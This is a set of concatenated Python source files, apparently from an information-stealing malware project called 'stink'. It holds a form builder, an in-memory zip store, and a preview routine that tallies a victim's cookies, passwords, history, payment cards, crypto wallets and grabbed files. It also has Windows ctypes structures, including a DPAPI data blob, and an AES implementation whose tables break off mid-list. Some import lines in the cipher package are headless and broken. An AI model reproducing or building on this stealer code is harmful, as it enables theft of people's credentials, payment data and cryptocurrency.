            return f"multipart/form-data; boundary={self.__boundary}", body.getvalue()

        except Exception as e:
            print(f"[Form]: {repr(e)}")


# Content from stink/stink/helpers/storage.py
from io import BytesIO
from os import path, walk
from textwrap import dedent
from typing import Any, AnyStr, List, Optional, Tuple, Union
from zipfile import ZIP_DEFLATED, ZipFile

from stink.helpers.dataclasses import Data, Field


class MemoryStorage:
    """
    Creates a storage in the memory.
    """

    def __init__(self):
        self.__buffer = BytesIO()
        self.__files = []
        self.__counts = []

    def add_from_memory(self, source_path: str, content: Union[str, bytes]) -> None:
        """
        Adds a file to the list of files.

        Parameters:
        - source_path [str]: File name or path inside the archive.
        - content [str|bytes]: File content.

        Returns:
        - None.
        """
        self.__files.append((source_path, content))

    def add_from_disk(self, source_path: str, zip_path: Optional[str] = None) -> None:
        """
        Adds a file path to the list of files.

        Parameters:
        - source_path [str]: File name or path to be copied.
        - zip_path [str]: Path to the file or folder in the archive.

        Returns:
        - None.
        """
        if path.isfile(source_path):
            if zip_path:
                self.__files.append((zip_path, open(source_path, "rb").read()))
            else:
                self.__files.append(
                    (path.basename(source_path), open(source_path, "rb").read())
                )

        elif path.isdir(source_path):
            for folder_name, _, file_names in walk(source_path):
                for file_name in file_names:
                    try:
                        file_path = path.join(folder_name, file_name)
                        name_in_zip = path.relpath(file_path, source_path)

                        if zip_path:
                            name_in_zip = path.join(zip_path, name_in_zip)

                        self.__files.append((name_in_zip, open(file_path, "rb").read()))
                    except Exception as e:
                        print(
                            f"[Storage]: Error while copying a file {file_name} - {repr(e)}"
                        )
        else:
            print("[Storage]: The file is unsupported.")

    def add_data(self, name: str, data: Any) -> None:
        self.__counts.append(Field(name, data))

    @staticmethod
    def create_preview(fields: List[Field]) -> str:
        """
        Creates a preview of the collected data.

        Parameters:
        - fields [list]: List of fields with data.

        Returns:
        - None.
        """
        computer = {"User": "Unknown", "IP": "Unknown", "OS": "Unknown"}
        browsers = {
            "Cookies": 0,
            "Passwords": 0,
            "History": 0,
            "Bookmarks": 0,
            "Extensions": 0,
            "Cards": 0,
        }
        applications, wallets, grabbers = [], [], []

        for field in fields:
            name, value = field.name, field.value

            if name in computer.keys():
                computer[name] = value

            elif name in browsers.keys():
                browsers[name] += value

            elif name == "Application":
                applications.append(value)

            elif name == "Wallet":
                wallets.append(value)

            elif name == "Grabber":
                grabbers.append(value)

        applications = (
            ", ".join(set(applications)) if applications else "No applications found"
        )
        wallets = ", ".join(set(wallets)) if wallets else "No wallets found"
        grabbers = ", ".join(set(grabbers)) if grabbers else "No grabbed files found"

        preview = dedent(
            f"""
        🖥️ User: {computer["User"]}
        🌐 IP: {computer["IP"]}
        📋 OS Name: {computer["OS"]}
        
        🍪 Cookies: {browsers["Cookies"]}
        🔒 Passwords: {browsers["Passwords"]}
        📖 History: {browsers["History"]}
        📚 Bookmarks: {browsers["Bookmarks"]}
        📦 Extensions: {browsers["Extensions"]}
        💳 Cards: {browsers["Cards"]}
        
        📁 Other applications:
        {applications}
        
        💸 Crypto wallets:
        {wallets}
        
        📝 Grabbed files:
        {grabbers}
        """
        )

        return preview

    def get_data(self) -> Data:
        """
        Returns the contents of the archive.

        Parameters:
        - None.

        Returns:
        - None.
        """
        return Data(self.__files, self.__counts)

    def create_zip(self, files: Optional[List[Tuple[str, AnyStr]]] = None) -> BytesIO:
        """
        Adds files from a list of data returned by get_data method of other MemoryStorage objects into one archive.

        Parameters:
        - files [list]: List of files for creating the archive.

        Returns:
        - BytesIO: BytesIO object.
        """
        if files is None:
            files = self.__files

        with ZipFile(self.__buffer, mode="w", compression=ZIP_DEFLATED) as zip_file:
            for file_name, content in files:
                zip_file.writestr(file_name, content)

        self.__buffer.seek(0)
        return self.__buffer


# Content from stink/stink/helpers/structures.py
from ctypes import (
    POINTER,
    Structure,
    c_char,
    c_size_t,
    c_uint32,
    c_ulong,
    c_ulonglong,
    c_wchar,
)
from ctypes.wintypes import CHAR, DWORD, LONG, MAX_PATH, ULONG, WORD


class DataBlob(Structure):
    _fields_ = [("cbData", DWORD), ("pbData", POINTER(c_char))]


class ProcessEntry32(Structure):
    _fields_ = [
        ("dwSize", DWORD),
        ("cntUsage", DWORD),
        ("th32ProcessID", DWORD),
        ("th32DefaultHeapID", POINTER(ULONG)),
        ("th32ModuleID", DWORD),
        ("cntThreads", DWORD),
        ("th32ParentProcessID", DWORD),
        ("pcPriClassBase", LONG),
        ("dwFlags", DWORD),
        ("szExeFile", CHAR * MAX_PATH),
    ]


class ProcessMemoryCountersEx(Structure):
    _fields_ = [
        ("cb", c_ulong),
        ("PageFaultCount", c_ulong),
        ("PeakWorkingSetSize", c_size_t),
        ("WorkingSetSize", c_size_t),
        ("QuotaPeakPagedPoolUsage", c_size_t),
        ("QuotaPagedPoolUsage", c_size_t),
        ("QuotaPeakNonPagedPoolUsage", c_size_t),
        ("QuotaNonPagedPoolUsage", c_size_t),
        ("PagefileUsage", c_size_t),
        ("PeakPagefileUsage", c_size_t),
        ("PrivateUsage", c_size_t),
    ]


class DisplayDevice(Structure):
    _fields_ = [
        ("cb", c_ulong),
        ("DeviceName", c_wchar * 32),
        ("DeviceString", c_wchar * 128),
        ("StateFlags", c_ulong),
        ("DeviceID", c_wchar * 128),
        ("DeviceKey", c_wchar * 128),
    ]


class MemoryStatusEx(Structure):
    _fields_ = [
        ("dwLength", c_uint32),
        ("dwMemoryLoad", c_uint32),
        ("ullTotalPhys", c_ulonglong),
        ("ullAvailPhys", c_ulonglong),
        ("ullTotalPageFile", c_ulonglong),
        ("ullAvailPageFile", c_ulonglong),
        ("ullTotalVirtual", c_ulonglong),
        ("ullAvailVirtual", c_ulonglong),
        ("sullAvailExtendedVirtual", c_ulonglong),
    ]


class UlargeInteger(Structure):
    _fields_ = [("LowPart", c_ulong), ("HighPart", c_ulong)]


class BitmapInfoHeader(Structure):
    _fields_ = [
        ("biSize", DWORD),
        ("biWidth", LONG),
        ("biHeight", LONG),
        ("biPlanes", WORD),
        ("biBitCount", WORD),
        ("biCompression", DWORD),
        ("biSizeImage", DWORD),
        ("biXPelsPerMeter", LONG),
        ("biYPelsPerMeter", LONG),
        ("biClrUsed", DWORD),
        ("biClrImportant", DWORD),
    ]


class BitmapInfo(Structure):
    _fields_ = [("bmiHeader", BitmapInfoHeader), ("bmiColors", DWORD * 3)]


# Content from stink/stink/helpers/cipher/__init__.py
    AES,
    AESModeOfOperationCTR,
    AESModeOfOperationGCM,
    AESModesOfOperation,
    AESSegmentModeOfOperation,
    Counter,
)
    PADDING_DEFAULT,
    PADDING_NONE,
    Decrypter,
    Encrypter,
    decrypt_stream,
    encrypt_stream,
)

    "AES",
    "AESModeOfOperationCTR",
    "AESModeOfOperationGCM",
    "AESModesOfOperation",
    "AESSegmentModeOfOperation",
    "Counter",
]


# Content from stink/stink/helpers/cipher/aes.py
import copy
import struct


def _compact_word(word):
    return (word[0] << 24) | (word[1] << 16) | (word[2] << 8) | word[3]


def _string_to_bytes(text):
    return list(ord(c) for c in text)


def _bytes_to_string(binary):
    return "".join(chr(b) for b in binary)


def _concat_list(a, b):
    return a + b


try:
    xrange
except Exception:
    xrange = range

    def _string_to_bytes(text):
        if isinstance(text, bytes):
            return text
        return [ord(c) for c in text]

    def _bytes_to_string(binary):
        return bytes(binary)

    def _concat_list(a, b):
        return a + bytes(b)


class AES(object):

    number_of_rounds = {16: 10, 24: 12, 32: 14}
    rcon = [
        0x01,
        0x02,
        0x04,
        0x08,
        0x10,
        0x20,
        0x40,
        0x80,
        0x1B,
        0x36,
        0x6C,
        0xD8,
        0xAB,
        0x4D,
        0x9A,
        0x2F,
        0x5E,
        0xBC,
        0x63,
        0xC6,
        0x97,
        0x35,
        0x6A,
        0xD4,
        0xB3,
        0x7D,
        0xFA,
        0xEF,
        0xC5,
        0x91,
    ]
    S = [
        0x63,
        0x7C,
        0x77,
        0x7B,
        0xF2,
        0x6B,
        0x6F,
        0xC5,
        0x30,
        0x01,
        0x67,
        0x2B,
        0xFE,
        0xD7,
        0xAB,
        0x76,
        0xCA,
        0x82,
        0xC9,
        0x7D,
        0xFA,
        0x59,
        0x47,
        0xF0,
        0xAD,
        0xD4,
        0xA2,
        0xAF,
        0x9C,
        0xA4,
        0x72,
        0xC0,
        0xB7,
        0xFD,
        0x93,
        0x26,
        0x36,
        0x3F,
        0xF7,
        0xCC,
        0x34,
        0xA5,
        0xE5,
        0xF1,
        0x71,
        0xD8,
        0x31,
        0x15,
        0x04,
        0xC7,
        0x23,
        0xC3,
        0x18,
        0x96,
        0x05,
        0x9A,
        0x07,
        0x12,
        0x80,
        0xE2,
        0xEB,
        0x27,
        0xB2,
        0x75,
        0x09,
        0x83,
        0x2C,
        0x1A,
        0x1B,
        0x6E,
        0x5A,
        0xA0,
        0x52,
        0x3B,
        0xD6,
        0xB3,
        0x29,
        0xE3,
        0x2F,
        0x84,
        0x53,
        0xD1,
        0x00,
        0xED,
        0x20,
        0xFC,
        0xB1,
        0x5B,
        0x6A,
        0xCB,
        0xBE,
        0x39,
        0x4A,
        0x4C,
        0x58,
        0xCF,
        0xD0,
        0xEF,
        0xAA,
        0xFB,
        0x43,
        0x4D,
        0x33,
        0x85,
        0x45,
        0xF9,
        0x02,
        0x7F,
        0x50,
        0x3C,
        0x9F,
        0xA8,
        0x51,
        0xA3,
        0x40,
        0x8F,
        0x92,
        0x9D,
        0x38,
        0xF5,
        0xBC,
        0xB6,
        0xDA,
        0x21,
        0x10,
        0xFF,
        0xF3,
        0xD2,
        0xCD,
        0x0C,
        0x13,
        0xEC,
        0x5F,
        0x97,
        0x44,
        0x17,
        0xC4,
        0xA7,
        0x7E,
        0x3D,
        0x64,
        0x5D,
        0x19,
        0x73,
        0x60,
        0x81,
        0x4F,
        0xDC,
        0x22,
        0x2A,
        0x90,
        0x88,
        0x46,
        0xEE,
        0xB8,
        0x14,
        0xDE,
        0x5E,
        0x0B,
        0xDB,
        0xE0,
        0x32,
        0x3A,
        0x0A,
        0x49,
        0x06,
        0x24,
        0x5C,
        0xC2,
        0xD3,
        0xAC,
        0x62,
        0x91,
        0x95,
        0xE4,
        0x79,
        0xE7,
        0xC8,
        0x37,
        0x6D,
        0x8D,
        0xD5,
        0x4E,
        0xA9,
        0x6C,
        0x56,
        0xF4,
        0xEA,
        0x65,
        0x7A,
        0xAE,
        0x08,
        0xBA,
        0x78,
        0x25,
        0x2E,
        0x1C,
        0xA6,
        0xB4,
        0xC6,
        0xE8,
        0xDD,
        0x74,
        0x1F,
        0x4B,
        0xBD,
        0x8B,
        0x8A,
        0x70,
        0x3E,
        0xB5,
        0x66,
        0x48,
        0x03,
        0xF6,
        0x0E,
        0x61,
        0x35,
        0x57,
        0xB9,
        0x86,
        0xC1,
        0x1D,
        0x9E,
        0xE1,
        0xF8,
        0x98,
        0x11,
        0x69,
        0xD9,
        0x8E,
        0x94,
        0x9B,
        0x1E,
        0x87,
        0xE9,
        0xCE,
        0x55,
        0x28,
        0xDF,
        0x8C,
        0xA1,
        0x89,
        0x0D,
        0xBF,
        0xE6,
        0x42,
        0x68,
        0x41,
        0x99,
        0x2D,
        0x0F,
        0xB0,
        0x54,
        0xBB,
        0x16,
    ]
    Si = [
        0x52,
        0x09,
        0x6A,
        0xD5,
        0x30,
        0x36,
        0xA5,
        0x38,
        0xBF,
        0x40,
        0xA3,
        0x9E,
        0x81,
        0xF3,
        0xD7,
        0xFB,
        0x7C,
        0xE3,
        0x39,
        0x82,
        0x9B,
        0x2F,
        0xFF,
        0x87,
        0x34,
        0x8E,
        0x43,
        0x44,
        0xC4,
        0xDE,
        0xE9,
        0xCB,
        0x54,
        0x7B,
        0x94,
        0x32,
        0xA6,
        0xC2,
        0x23,
        0x3D,
        0xEE,
        0x4C,
        0x95,
        0x0B,
        0x42,
        0xFA,
        0xC3,
        0x4E,
        0x08,
        0x2E,
        0xA1,
        0x66,
        0x28,
        0xD9,
        0x24,
        0xB2,
        0x76,
        0x5B,
        0xA2,
        0x49,
        0x6D,
        0x8B,
        0xD1,
        0x25,
        0x72,
        0xF8,
        0xF6,
        0x64,
        0x86,
        0x68,
        0x98,
        0x16,
        0xD4,
        0xA4,
        0x5C,
        0xCC,
        0x5D,
        0x65,
        0xB6,
        0x92,
        0x6C,
        0x70,
        0x48,
        0x50,
        0xFD,
        0xED,
        0xB9,
        0xDA,
        0x5E,
        0x15,
        0x46,
        0x57,
        0xA7,
        0x8D,
        0x9D,
        0x84,
        0x90,
        0xD8,
        0xAB,
        0x00,
        0x8C,
        0xBC,
        0xD3,
        0x0A,
        0xF7,
        0xE4,
        0x58,
        0x05,
        0xB8,
        0xB3,
        0x45,
        0x06,
        0xD0,
        0x2C,
        0x1E,
        0x8F,
        0xCA,
        0x3F,
        0x0F,
        0x02,
        0xC1,
        0xAF,
        0xBD,
        0x03,
        0x01,
        0x13,
        0x8A,
        0x6B,
        0x3A,
        0x91,
        0x11,
        0x41,
        0x4F,
        0x67,
        0xDC,
        0xEA,
        0x97,
        0xF2,
        0xCF,
        0xCE,
        0xF0,
        0xB4,
        0xE6,
        0x73,
        0x96,
        0xAC,
        0x74,
        0x22,
        0xE7,
        0xAD,
        0x35,
        0x85,
        0xE2,
        0xF9,
        0x37,
        0xE8,
        0x1C,
        0x75,
        0xDF,
        0x6E,
        0x47,
        0xF1,
        0x1A,
        0x71,
        0x1D,
        0x29,
        0xC5,
        0x89,
        0x6F,
        0xB7,
        0x62,
        0x0E,
        0xAA,
        0x18,
        0xBE,
        0x1B,
        0xFC,
        0x56,
        0x3E,
        0x4B,
        0xC6,
        0xD2,
        0x79,
        0x20,
        0x9A,
        0xDB,
        0xC0,
        0xFE,
        0x78,
        0xCD,
        0x5A,
        0xF4,
        0x1F,
        0xDD,
        0xA8,
        0x33,
        0x88,
        0x07,
        0xC7,
        0x31,
        0xB1,
        0x12,
        0x10,
        0x59,
        0x27,
        0x80,
        0xEC,
        0x5F,
        0x60,
        0x51,
        0x7F,
        0xA9,
        0x19,
        0xB5,
        0x4A,
        0x0D,
        0x2D,
        0xE5,
        0x7A,
        0x9F,
        0x93,
        0xC9,
        0x9C,
        0xEF,
        0xA0,
        0xE0,
        0x3B,
        0x4D,
        0xAE,
        0x2A,
        0xF5,
        0xB0,
        0xC8,
        0xEB,
        0xBB,
        0x3C,
        0x83,
        0x53,
        0x99,
        0x61,
        0x17,
        0x2B,
        0x04,
        0x7E,
        0xBA,
        0x77,
        0xD6,
        0x26,
        0xE1,
        0x69,
        0x14,
        0x63,
        0x55,
        0x21,
        0x0C,
        0x7D,
    ]
    T1 = [
        0xC66363A5,
        0xF87C7C84,
        0xEE777799,
        0xF67B7B8D,
        0xFFF2F20D,
        0xD66B6BBD,
        0xDE6F6FB1,
        0x91C5C554,
        0x60303050,
        0x02010103,
        0xCE6767A9,
        0x562B2B7D,
        0xE7FEFE19,
        0xB5D7D762,
        0x4DABABE6,
        0xEC76769A,
        0x8FCACA45,
        0x1F82829D,
        0x89C9C940,
        0xFA7D7D87,
        0xEFFAFA15,
        0xB25959EB,
        0x8E4747C9,
        0xFBF0F00B,
        0x41ADADEC,
        0xB3D4D467,
        0x5FA2A2FD,
        0x45AFAFEA,
        0x239C9CBF,
        0x53A4A4F7,
        0xE4727296,
        0x9BC0C05B,
        0x75B7B7C2,
        0xE1FDFD1C,
        0x3D9393AE,
        0x4C26266A,
        0x6C36365A,
        0x7E3F3F41,
        0xF5F7F702,
        0x83CCCC4F,
        0x6834345C,
        0x51A5A5F4,
        0xD1E5E534,
        0xF9F1F108,
        0xE2717193,
        0xABD8D873,
        0x62313153,
        0x2A15153F,
        0x0804040C,
        0x95C7C752,
        0x46232365,
        0x9DC3C35E,
        0x30181828,
        0x379696A1,
        0x0A05050F,
        0x2F9A9AB5,
        0x0E070709,
        0x24121236,
        0x1B80809B,
        0xDFE2E23D,
        0xCDEBEB26,
        0x4E272769,
        0x7FB2B2CD,
        0xEA75759F,
        0x1209091B,
        0x1D83839E,
        0x582C2C74,
        0x341A1A2E,
        0x361B1B2D,
        0xDC6E6EB2,
        0xB45A5AEE,
        0x5BA0A0FB,
        0xA45252F6,
        0x763B3B4D,
        0xB7D6D661,
        0x7DB3B3CE,
        0x5229297B,
        0xDDE3E33E,
        0x5E2F2F71,
        0x13848497,
        0xA65353F5,
        0xB9D1D168,
        0x00000000,
        0xC1EDED2C,
        0x40202060,
        0xE3FCFC1F,
        0x79B1B1C8,
        0xB65B5BED,
        0xD46A6ABE,
        0x8DCBCB46,
        0x67BEBED9,
        0x7239394B,
        0x944A4ADE,
        0x984C4CD4,
        0xB05858E8,
        0x85CFCF4A,
        0xBBD0D06B,
        0xC5EFEF2A,
        0x4FAAAAE5,
        0xEDFBFB16,
        0x864343C5,
        0x9A4D4DD7,
        0x66333355,
        0x11858594,
        0x8A4545CF,
        0xE9F9F910,
        0x04020206,
        0xFE7F7F81,
        0xA05050F0,
        0x783C3C44,
        0x259F9FBA,
        0x4BA8A8E3,
        0xA25151F3,
        0x5DA3A3FE,
        0x804040C0,
        0x058F8F8A,
        0x3F9292AD,
        0x219D9DBC,
        0x70383848,
        0xF1F5F504,
        0x63BCBCDF,
        0x77B6B6C1,
        0xAFDADA75,
        0x42212163,
        0x20101030,
        0xE5FFFF1A,
        0xFDF3F30E,
        0xBFD2D26D,
        0x81CDCD4C,
        0x180C0C14,
        0x26131335,
        0xC3ECEC2F,
        0xBE5F5FE1,
        0x359797A2,
        0x884444CC,
        0x2E171739,
        0x93C4C457,
        0x55A7A7F2,
        0xFC7E7E82,
        0x7A3D3D47,
        0xC86464AC,
        0xBA5D5DE7,
        0x3219192B,
        0xE6737395,
        0xC06060A0,
        0x19818198,
        0x9E4F4FD1,
        0xA3DCDC7F,
        0x44222266,
        0x542A2A7E,
        0x3B9090AB,
        0x0B888883,
        0x8C4646CA,
        0xC7EEEE29,
        0x6BB8B8D3,
        0x2814143C,
        0xA7DEDE79,
        0xBC5E5EE2,
        0x160B0B1D,
        0xADDBDB76,
        0xDBE0E03B,
        0x64323256,
        0x743A3A4E,
        0x140A0A1E,
        0x924949DB,
        0x0C06060A,
        0x4824246C,
        0xB85C5CE4,
        0x9FC2C25D,
        0xBDD3D36E,
        0x43ACACEF,
        0xC46262A6,
        0x399191A8,
        0x319595A4,
        0xD3E4E437,
        0xF279798B,
        0xD5E7E732,
        0x8BC8C843,
        0x6E373759,
        0xDA6D6DB7,
        0x018D8D8C,
        0xB1D5D564,
        0x9C4E4ED2,
        0x49A9A9E0,
        0xD86C6CB4,
        0xAC5656FA,
        0xF3F4F407,
        0xCFEAEA25,
        0xCA6565AF,
        0xF47A7A8E,
        0x47AEAEE9,
        0x10080818,
        0x6FBABAD5,
        0xF0787888,
        0x4A25256F,
        0x5C2E2E72,
        0x381C1C24,
        0x57A6A6F1,
        0x73B4B4C7,
        0x97C6C651,
        0xCBE8E823,
        0xA1DDDD7C,
        0xE874749C,
        0x3E1F1F21,
        0x964B4BDD,
        0x61BDBDDC,
        0x0D8B8B86,
        0x0F8A8A85,
        0xE0707090,
        0x7C3E3E42,
        0x71B5B5C4,
        0xCC6666AA,
        0x904848D8,
        0x06030305,
        0xF7F6F601,
        0x1C0E0E12,
        0xC26161A3,
        0x6A35355F,
        0xAE5757F9,
        0x69B9B9D0,
        0x17868691,
        0x99C1C158,
        0x3A1D1D27,
        0x279E9EB9,
        0xD9E1E138,
        0xEBF8F813,
        0x2B9898B3,
        0x22111133,
        0xD26969BB,
        0xA9D9D970,
        0x078E8E89,
        0x339494A7,
        0x2D9B9BB6,
        0x3C1E1E22,
        0x15878792,
        0xC9E9E920,
        0x87CECE49,
        0xAA5555FF,
        0x50282878,
        0xA5DFDF7A,
        0x038C8C8F,
        0x59A1A1F8,
        0x09898980,
        0x1A0D0D17,
        0x65BFBFDA,
        0xD7E6E631,
        0x844242C6,
        0xD06868B8,
        0x824141C3,
        0x299999B0,
        0x5A2D2D77,
        0x1E0F0F11,
        0x7BB0B0CB,
        0xA85454FC,
        0x6DBBBBD6,
        0x2C16163A,
    ]
    T2 = [
        0xA5C66363,
        0x84F87C7C,
        0x99EE7777,
        0x8DF67B7B,
        0x0DFFF2F2,
        0xBDD66B6B,
        0xB1DE6F6F,
        0x5491C5C5,
        0x50603030,
        0x03020101,
        0xA9CE6767,
        0x7D562B2B,
        0x19E7FEFE,
        0x62B5D7D7,
        0xE64DABAB,
        0x9AEC7676,
        0x458FCACA,
        0x9D1F8282,
        0x4089C9C9,
        0x87FA7D7D,
        0x15EFFAFA,
        0xEBB25959,
        0xC98E4747,
        0x0BFBF0F0,
        0xEC41ADAD,
        0x67B3D4D4,
        0xFD5FA2A2,
        0xEA45AFAF,
        0xBF239C9C,
        0xF753A4A4,
        0x96E47272,
        0x5B9BC0C0,
        0xC275B7B7,
        0x1CE1FDFD,
        0xAE3D9393,
        0x6A4C2626,
        0x5A6C3636,
        0x417E3F3F,
        0x02F5F7F7,
        0x4F83CCCC,
        0x5C683434,
        0xF451A5A5,
        0x34D1E5E5,
        0x08F9F1F1,
        0x93E27171,
        0x73ABD8D8,
        0x53623131,
        0x3F2A1515,
        0x0C080404,
        0x5295C7C7,
        0x65462323,
        0x5E9DC3C3,
        0x28301818,
        0xA1379696,
        0x0F0A0505,
        0xB52F9A9A,
        0x090E0707,
        0x36241212,
        0x9B1B8080,
        0x3DDFE2E2,
        0x26CDEBEB,
        0x694E2727,
        0xCD7FB2B2,
        0x9FEA7575,
        0x1B120909,
        0x9E1D8383,
        0x74582C2C,
        0x2E341A1A,
        0x2D361B1B,
        0xB2DC6E6E,
        0xEEB45A5A,
        0xFB5BA0A0,
        0xF6A45252,
        0x4D763B3B,
        0x61B7D6D6,
        0xCE7DB3B3,
        0x7B522929,
        0x3EDDE3E3,
        0x715E2F2F,
        0x97138484,
        0xF5A65353,
        0x68B9D1D1,
        0x00000000,
        0x2CC1EDED,
        0x60402020,
        0x1FE3FCFC,
        0xC879B1B1,
        0xEDB65B5B,
        0xBED46A6A,
        0x468DCBCB,
        0xD967BEBE,
        0x4B723939,
        0xDE944A4A,
        0xD4984C4C,
        0xE8B05858,
        0x4A85CFCF,
        0x6BBBD0D0,
        0x2AC5EFEF,
        0xE54FAAAA,
        0x16EDFBFB,
        0xC5864343,
        0xD79A4D4D,
        0x55663333,
        0x94118585,
        0xCF8A4545,
        0x10E9F9F9,
        0x06040202,
        0x81FE7F7F,
        0xF0A05050,
        0x44783C3C,
        0xBA259F9F,
        0xE34BA8A8,
        0xF3A25151,
        0xFE5DA3A3,
        0xC0804040,
        0x8A058F8F,
        0xAD3F9292,
        0xBC219D9D,
        0x48703838,
        0x04F1F5F5,
        0xDF63BCBC,
        0xC177B6B6,
        0x75AFDADA,
        0x63422121,
        0x30201010,
        0x1AE5FFFF,
        0x0EFDF3F3,
        0x6DBFD2D2,
        0x4C81CDCD,
        0x14180C0C,
        0x35261313,
        0x2FC3ECEC,
        0xE1BE5F5F,
        0xA2359797,
        0xCC884444,
        0x392E1717,
        0x5793C4C4,
        0xF255A7A7,
        0x82FC7E7E,
        0x477A3D3D,
        0xACC86464,
        0xE7BA5D5D,
        0x2B321919,
        0x95E67373,
        0xA0C06060,
        0x98198181,
        0xD19E4F4F,
        0x7FA3DCDC,
        0x66442222,
        0x7E542A2A,
        0xAB3B9090,
        0x830B8888,
        0xCA8C4646,
        0x29C7EEEE,
        0xD36BB8B8,
        0x3C281414,
        0x79A7DEDE,
        0xE2BC5E5E,
        0x1D160B0B,
        0x76ADDBDB,
        0x3BDBE0E0,
        0x56643232,
        0x4E743A3A,
        0x1E140A0A,
        0xDB924949,
        0x0A0C0606,
        0x6C482424,
        0xE4B85C5C,
        0x5D9FC2C2,
        0x6EBDD3D3,
        0xEF43ACAC,
        0xA6C46262,
        0xA8399191,
        0xA4319595,
        0x37D3E4E4,
        0x8BF27979,
        0x32D5E7E7,
        0x438BC8C8,
        0x596E3737,
        0xB7DA6D6D,
        0x8C018D8D,
        0x64B1D5D5,
        0xD29C4E4E,
        0xE049A9A9,
        0xB4D86C6C,
        0xFAAC5656,
        0x07F3F4F4,
        0x25CFEAEA,
        0xAFCA6565,
        0x8EF47A7A,
        0xE947AEAE,
        0x18100808,
        0xD56FBABA,
        0x88F07878,
        0x6F4A2525,
        0x725C2E2E,
        0x24381C1C,
        0xF157A6A6,
        0xC773B4B4,
        0x5197C6C6,
        0x23CBE8E8,
        0x7CA1DDDD,
        0x9CE87474,
        0x213E1F1F,
        0xDD964B4B,
        0xDC61BDBD,
        0x860D8B8B,
        0x850F8A8A,
        0x90E07070,
        0x427C3E3E,
        0xC471B5B5,
        0xAACC6666,
        0xD8904848,
        0x05060303,
        0x01F7F6F6,
        0x121C0E0E,
        0xA3C26161,
        0x5F6A3535,
        0xF9AE5757,
        0xD069B9B9,
        0x91178686,
        0x5899C1C1,
        0x273A1D1D,
        0xB9279E9E,
        0x38D9E1E1,
        0x13EBF8F8,
        0xB32B9898,
        0x33221111,
        0xBBD26969,
        0x70A9D9D9,
        0x89078E8E,
        0xA7339494,
        0xB62D9B9B,
        0x223C1E1E,
        0x92158787,
        0x20C9E9E9,
        0x4987CECE,
        0xFFAA5555,
        0x78502828,
        0x7AA5DFDF,
        0x8F038C8C,
        0xF859A1A1,
        0x80098989,
        0x171A0D0D,
        0xDA65BFBF,
        0x31D7E6E6,
        0xC6844242,
        0xB8D06868,
        0xC3824141,
        0xB0299999,
        0x775A2D2D,
        0x111E0F0F,
        0xCB7BB0B0,
        0xFCA85454,
        0xD66DBBBB,
        0x3A2C1616,
    ]
    T3 = [
        0x63A5C663,
        0x7C84F87C,
        0x7799EE77,
        0x7B8DF67B,
        0xF20DFFF2,
        0x6BBDD66B,
        0x6FB1DE6F,
        0xC55491C5,
        0x30506030,
        0x01030201,
        0x67A9CE67,
        0x2B7D562B,
        0xFE19E7FE,
        0xD762B5D7,
        0xABE64DAB,
        0x769AEC76,
        0xCA458FCA,
        0x829D1F82,
        0xC94089C9,
        0x7D87FA7D,
        0xFA15EFFA,
        0x59EBB259,
        0x47C98E47,
        0xF00BFBF0,
        0xADEC41AD,
        0xD467B3D4,
        0xA2FD5FA2,
        0xAFEA45AF,
        0x9CBF239C,
        0xA4F753A4,
        0x7296E472,
        0xC05B9BC0,
        0xB7C275B7,
        0xFD1CE1FD,
        0x93AE3D93,
        0x266A4C26,
        0x365A6C36,
        0x3F417E3F,
        0xF702F5F7,
        0xCC4F83CC,
        0x345C6834,
        0xA5F451A5,
        0xE534D1E5,
        0xF108F9F1,
        0x7193E271,
        0xD873ABD8,
        0x31536231,
        0x153F2A15,
        0x040C0804,
        0xC75295C7,
        0x23654623,
        0xC35E9DC3,
        0x18283018,
        0x96A13796,
        0x050F0A05,
        0x9AB52F9A,
        0x07090E07,
        0x12362412,
        0x809B1B80,
        0xE23DDFE2,
        0xEB26CDEB,
        0x27694E27,
        0xB2CD7FB2,
        0x759FEA75,
        0x091B1209,
        0x839E1D83,
        0x2C74582C,
        0x1A2E341A,
        0x1B2D361B,
        0x6EB2DC6E,
        0x5AEEB45A,
        0xA0FB5BA0,
        0x52F6A452,
        0x3B4D763B,
        0xD661B7D6,
        0xB3CE7DB3,
        0x297B5229,
        0xE33EDDE3,
        0x2F715E2F,
        0x84971384,
        0x53F5A653,
        0xD168B9D1,
        0x00000000,
        0xED2CC1ED,
        0x20604020,
        0xFC1FE3FC,
        0xB1C879B1,
        0x5BEDB65B,
        0x6ABED46A,
        0xCB468DCB,
        0xBED967BE,
        0x394B7239,
        0x4ADE944A,
        0x4CD4984C,
        0x58E8B058,
        0xCF4A85CF,
        0xD06BBBD0,
        0xEF2AC5EF,
        0xAAE54FAA,
        0xFB16EDFB,
        0x43C58643,
        0x4DD79A4D,
        0x33556633,
        0x85941185,
        0x45CF8A45,
        0xF910E9F9,
        0x02060402,
        0x7F81FE7F,
        0x50F0A050,
        0x3C44783C,
        0x9FBA259F,
        0xA8E34BA8,
        0x51F3A251,
        0xA3FE5DA3,
        0x40C08040,
        0x8F8A058F,
        0x92AD3F92,
        0x9DBC219D,
        0x38487038,
        0xF504F1F5,
        0xBCDF63BC,
        0xB6C177B6,
        0xDA75AFDA,
        0x21634221,
        0x10302010,
        0xFF1AE5FF,
        0xF30EFDF3,
        0xD26DBFD2,
        0xCD4C81CD,
        0x0C14180C,
        0x13352613,
        0xEC2FC3EC,
        0x5FE1BE5F,
        0x97A23597,
        0x44CC8844,
        0x17392E17,
        0xC45793C4,
        0xA7F255A7,
        0x7E82FC7E,
        0x3D477A3D,
        0x64ACC864,
        0x5DE7BA5D,
        0x192B3219,
        0x7395E673,
        0x60A0C060,
        0x81981981,
        0x4FD19E4F,
        0xDC7FA3DC,
        0x22664422,
        0x2A7E542A,
        0x90AB3B90,
        0x88830B88,
        0x46CA8C46,
        0xEE29C7EE,
        0xB8D36BB8,
        0x143C2814,
        0xDE79A7DE,
        0x5EE2BC5E,
        0x0B1D160B,
        0xDB76ADDB,
        0xE03BDBE0,
        0x32566432,
        0x3A4E743A,
        0x0A1E140A,
        0x49DB9249,
        0x060A0C06,
        0x246C4824,
        0x5CE4B85C,
        0xC25D9FC2,
        0xD36EBDD3,
        0xACEF43AC,
        0x62A6C462,
        0x91A83991,
        0x95A43195,
        0xE437D3E4,
        0x798BF279,
        0xE732D5E7,
        0xC8438BC8,
        0x37596E37,
        0x6DB7DA6D,
        0x8D8C018D,
        0xD564B1D5,
        0x4ED29C4E,
        0xA9E049A9,
        0x6CB4D86C,
        0x56FAAC56,
        0xF407F3F4,
        0xEA25CFEA,
        0x65AFCA65,
        0x7A8EF47A,
        0xAEE947AE,
        0x08181008,
        0xBAD56FBA,
        0x7888F078,
        0x256F4A25,
        0x2E725C2E,
        0x1C24381C,
